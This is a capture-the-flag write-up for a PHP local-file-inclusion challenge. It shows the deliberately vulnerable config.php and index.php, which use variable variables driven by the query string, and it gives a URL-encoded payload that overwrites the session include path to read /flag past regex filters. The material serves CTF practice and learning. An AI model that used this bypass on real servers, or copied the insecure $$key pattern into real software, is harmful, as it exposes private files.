# Title
php_real_lefi

## Question
If you want to get flag, read /flag.

http://web.h4ckingga.me:10013

made by me2nuk

## Description
First, take a look at website and the code.

Here are config.php and index.php
```php
<?php 

session_start();

$admin = FALSE;

if($_SERVER['REMOTE_ADDR']){
    $admin = TRUE;
}

$_SESSION['include_path'] = 'nav.php';
$_SESSION['admin'] = $admin;

function fuck_path_change_or_check($path){
    if(preg_match("/\//isUD", $path)){
        exit("어이쿠 걸려버렸네?");
    }elseif(preg_match("/base64/i", $path)){
        exit("어이쿠 걸려버렸네?");
    }else{
        return str_replace("\\", "/", $path);
    }
}

function fuck_extract_filtering($get){
    if(preg_match("/_|session/isUD", $get)){
        exit("으아닛 이건 안된다구!");
    }else{
        return fuck_path_change_or_check($get);
    }
}
?>

```
index.php

```php
<?php 

include("config.php");

$query = fuck_extract_filtering($_SERVER['QUERY_STRING']);

parse_str($query, $arr);

foreach($arr as $key=>$value){
    $$key = fuck_path_change_or_check($value);
}

include($_SESSION['include_path']);

?>

<div style="magin-top:100px;">
안녕하세요 저희는 ElePHPant팀입니다 이번에 PHP 언어를 이용하여 개발 공부를 시작했는데요
아직 많이 부족한 지식으로 테스트용으로 개발된 사이트지만 보기만 하세요.. 보기만 하라니깐요?(^__________^)
</div>
```

If you try a typical PHP LFI attack such as ?file://flag, your attempt will be detected and blocked by the filters.

The only way to bypass the verification is by using URL encoding. You need to reference the ASCII code chart and encode the letters 's', '?', '_', and '/', since these characters are not allowed in the input.

The final payload should look like this:

http://web.h4ckingga.me:10013?%5f%53ESSION[include%5fpath]=%2fflag

This will allow you to access the flag.